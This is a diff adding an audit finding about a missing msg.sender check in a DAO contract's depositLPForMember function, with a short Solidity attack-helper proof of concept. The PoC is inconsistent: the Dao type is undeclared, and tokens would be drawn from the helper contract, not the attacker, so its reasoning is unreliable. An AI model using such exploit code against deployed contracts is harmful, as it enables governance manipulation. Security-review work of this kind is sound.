@@ -1,0 +1,58 @@
+Below is one access control “gotcha” found in the Dao contract. In our review we note that one of the functions meant for “on‐chain bookkeeping” (specifically depositing LP tokens on a member’s behalf) does not enforce that the sender is the same as the credited “member.” In other words, an external caller may call that function and provide any arbitrary address as the “member” parameter. This means that—even though the tokens are pulled from the caller’s balance (using msg.sender to transfer funds)—the deposit ultimately gets assigned to an account that the caller does not control. In a DAO context where the deposited amounts determine weight (and subsequently voting power and incentive claims) this can be misused to “game” the system by shifting weight into arbitrary accounts (or even “gift” weight to colluding addresses) without proper authorization.
+
+─────────────────────────────────────────────  
+Vulnerable Function:  
+   depositLPForMember(address pool, uint256 amount, address member)  
+   (approximately lines 40–60 in the source file)
+
+Access Control Issue:  
+• The function is declared public and can be called by any address.  
+• It uses msg.sender only for transferring tokens (via iBEP20(pool).transferFrom(msg.sender,…)) but uses the supplied “member” parameter to credit the deposit (by calling _DAOVAULT.depositLP(pool, amount, member) and updating mapMember_lastTime[member]).  
+• There is no check that msg.sender == member, so an attacker can call depositLPForMember on behalf of an arbitrary “member” address.  
+• As a result, an attacker can use funds they control to boost the recorded staking weight (and thus governance/voting weight or eligibility for rewards) of any target account—even one they do not own.  
+
+─────────────────────────────────────────────  
+Proof of Concept Example (Solidity snippet):
+
+-----------------------------------------------------------
+pragma solidity ^0.8.3;
+
+interface iBEP20 {
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+interface iPOOLFACTORY {
+    function isCuratedPool(address pool) external view returns (bool);
+}
+
+interface iDAOVAULT {
+    function depositLP(address pool, uint256 amount, address member) external;
+}
+
+contract AttackHelper {
+    Dao public dao;
+    iBEP20 public poolToken;
+    
+    // Assume attacker already has approved the token transfer for the poolToken
+    constructor(address _dao, address _poolToken) {
+        dao = Dao(_dao);
+        poolToken = iBEP20(_poolToken);
+    }
+    
+    // attacker calls this function to deposit tokens that come from his own funds,
+    // but credits the deposit to an arbitrary account (for example, an address the attacker controls elsewhere)
+    function depositForOther(address pool, uint256 amount, address arbitraryMember) external {
+        // Note: No check ensures msg.sender == arbitraryMember.
+        // The tokens are taken from msg.sender (i.e. the attacker)
+        // but the deposit is applied to the 'arbitraryMember' balance inside the DAO/DAOVault.
+        dao.depositLPForMember(pool, amount, arbitraryMember);
+    }
+}
+-----------------------------------------------------------
+
+─────────────────────────────────────────────  
+In summary:  
+• Function depositLPForMember (approximately lines 40–60) has an access control issue.  
+• Reason: There is no requirement that the sender (msg.sender) equals the “member” parameter, allowing any caller to redirect the deposit so as to affect governance weight and rewards.  
+
+Any proposal or vote decision that depends on the weight recorded in the DAOVault (and similarly in the BondVault) may be manipulated in an unintended manner if an attacker can arbitrarily “boost” an address’s weight by depositing their own funds under someone else’s identity.
